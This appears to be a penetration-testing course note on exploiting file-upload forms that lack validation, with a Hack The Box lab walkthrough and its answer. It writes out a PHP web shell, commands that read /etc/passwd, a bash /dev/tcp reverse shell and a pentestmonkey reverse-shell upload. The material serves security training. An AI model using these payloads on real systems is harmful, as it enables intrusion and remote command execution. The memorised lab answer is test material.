# Section 2 — Absent Validation (Arbitrary File Upload)

---

## Detection Workflow

1. Find an upload form (`<input type="file">`)
2. Check what's accepted client-side — `accept=` attribute, JS validation
3. Try a benign file of an unusual extension — `.txt`, `.php`, `.html`
4. If it succeeds → look for where it lands → request the uploaded file
5. If it renders/executes → arbitrary file upload confirmed

---

## Step 1 — Identify the Web Framework

You need to upload a payload in the **same language** the server runs. Quick fingerprinting:

```bash
# Check common extensions
for ext in php asp aspx jsp; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "http://TARGET/index.$ext")
  echo "$ext → $code"
done

# Server header
curl -sk -I "http://TARGET/" | grep -i 'server\|x-powered-by'

# Wappalyzer (browser extension) gives the full stack: server, language, libs
```
> Identifies the server language so you know which shell extension to upload. A 200 response on `index.php` means PHP is running. The `Server:` and `X-Powered-By:` headers often reveal the stack directly.

| Stack hint | Web shell extension |
|------------|--------------------|
| `X-Powered-By: PHP/X.Y` | `.php` (`.phtml`, `.php5` if blocked) |
| `Server: Microsoft-IIS/X` | `.aspx` (`.asp` for older) |
| `Server: Apache Tomcat` | `.jsp`, `.war` |
| Node.js (`Express`) | `.js` (limited — usually no direct exec) |

---

## Step 2 — Test with a Benign Script

Don't drop a full web shell first. Test with a minimal script to confirm execution:

```bash
echo '<?php echo "Hello HTB"; ?>' > test.php

curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@test.php"
curl -sk "http://TARGET/uploads/test.php"
# → "Hello HTB"   ✅ PHP is being executed
# → "<?php echo..." ❌ file is being served as text, not executed
```
> Tests with a safe echo script before uploading a real shell. If the server returns `Hello HTB`, PHP executes your code. If it returns the raw source, the extension isn't mapped to PHP.

**Three possible outcomes:**

| Response | What it means |
|----------|--------------|
| Script output (e.g. `Hello HTB`) | Server executes the file — **RCE achievable** |
| Raw source code | File saved but extension not interpreted (no exec) — try LFI / different ext |
| 404 / 403 / different message | Wrong upload path or extension blocked |

---

## Step 3 — Drop the Real Payload

Once execution confirmed, upload a parameter-driven shell:

```php
<?php system($_GET["cmd"]); ?>
```

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@shell.php"

# Run commands
curl "http://TARGET/uploads/shell.php?cmd=id"
curl "http://TARGET/uploads/shell.php?cmd=hostname"
curl "http://TARGET/uploads/shell.php?cmd=cat+/etc/passwd"
```
> Uploads a one-liner web shell and runs OS commands through it. The `cmd=` parameter passes each command to `system()`. Use `+` to represent spaces in the URL.

---

## Web Shell vs Reverse Shell

| Type | When |
|------|------|
| **Web shell** (`?cmd=...`) | Fast, simple, no listener needed. Good for enum, file reads. |
| **Reverse shell** | Interactive sessions, persistent foothold, post-exploit tooling |

Web shell first → confirm RCE → upgrade to reverse shell if needed:

```bash
curl "http://TARGET/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.17.176/4444+0>%261'"
```
> Triggers a bash reverse shell through the web shell. The `%26` and `%261` are URL-encoded `&` characters. Replace the IP with your tun0 address.

Or upload a dedicated reverse-shell PHP script:
```bash
# Use Kali's bundled one — edit IP/port first
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/rev.php
sed -i "s/127.0.0.1/10.10.17.176/; s/1234/4444/" /tmp/rev.php
curl -X POST "http://TARGET/upload.php" -F "uploadFile=@/tmp/rev.php"

# Start listener
nc -lvnp 4444

# Trigger
curl "http://TARGET/uploads/rev.php"
```
> Uses pentestmonkey's pre-built PHP reverse shell. `sed` patches the IP and port in-place. Start the listener before triggering the shell request.

---

## Finding the Upload Path

If not obvious from response:

```bash
# Check Network tab / response for URL hints
curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@test.php" -i | grep -i 'location\|url'

# Inspect a page that displays uploaded files (profile, gallery, etc.)
curl -sk "http://TARGET/profile.php" | grep -oP '(src|href)="[^"]+"'

# Fuzz common upload dirs:
for d in uploads upload files attachments avatars profile_images media documents; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "http://TARGET/$d/test.php")
  echo "/$d/ → $code"
done
```
> Three ways to find the upload storage path. The response headers often give it away. If not, inspect pages that display your file, or brute-force common directory names.

Common upload directories:
```
/uploads/  /upload/  /files/  /attachments/  /avatars/  /profile_images/
/images/   /media/   /documents/  /assets/uploads/  /static/uploads/
```

---

## Lab — Arbitrary PHP Upload

**Target:** `154.57.164.66:31723`

### Step 1 — Inspect form
```html
<form action="upload.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="uploadFile">
</form>
```
Field is `uploadFile`, endpoint `upload.php`. No `accept=` attribute → no client-side restriction.

### Step 2 — Upload PHP that runs `hostname`
```bash
echo '<?php system("hostname"); ?>' > /tmp/host.php

curl -sk -X POST "http://154.57.164.66:31723/upload.php" \
  -F "uploadFile=@/tmp/host.php"
# → "File successfully uploaded"

curl -sk "http://154.57.164.66:31723/uploads/host.php"
# → ng-2393564-fileuploadsabsentverification-zaizk-86d944c489-zkwbj
```
> Uploads a minimal PHP file that runs `hostname`. The second curl request triggers it. The long hyphenated output is the Kubernetes pod name — that is the answer.

**Answer:** `ng-2393564-fileuploadsabsentverification-zaizk-86d944c489-zkwbj`

> The hostname is a single token (no spaces) — the entire output is the "first word." Format pattern: Kubernetes pod name (`<chart>-<replica-set-hash>-<pod-hash>`).

---

## Exam Notes

- Absent validation is the cleanest possible upload bug — no bypass needed, just upload and trigger
- Always test with a **minimal echo** script first; saves cleanup time if exec doesn't work
- Stick to `system($_GET[X])` for parameter-driven shells — single quotes inside avoid escape issues; `X` short for less URL noise
- `multipart/form-data` is the only Content-Type for file uploads — `curl -F` handles it automatically
- Hosts in HTB labs are often k8s pods with long generated names — the whole hyphenated string is the hostname
- Reverse shells need an externally reachable listener — won't work on internal HTB pods without VPN routing back to you (lab targets here usually only need a web shell)
